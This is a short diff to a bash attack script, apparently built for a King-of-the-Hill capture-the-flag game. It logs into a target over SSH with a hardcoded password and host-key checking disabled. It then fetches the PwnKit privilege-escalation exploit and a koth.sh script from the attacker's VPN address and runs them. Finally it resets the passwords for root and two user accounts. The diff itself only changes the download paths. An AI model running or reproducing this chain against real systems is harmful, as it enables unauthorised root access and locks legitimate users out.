@@ -29,8 +29,8 @@ fi
 vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
 sshpass -p X8JEETQmf3hkS65f ssh -o StrictHostKeychecking=no narrator@"$IP" << EOF
-    cd /tmp && wget http://$vpn/PwnKit && chmod +x PwnKit && ./PwnKit
-    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username" 
+    cd /tmp && wget http://$vpn/bin/PwnKit && chmod +x PwnKit && ./PwnKit
+    cd /boot && wget http://$vpn/Scripts/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username" 
     echo "$new_password" | passwd --stdin root
     echo "$new_password" | passwd --stdin narrator
     echo "$new_password" | passwd --stdin tdurden
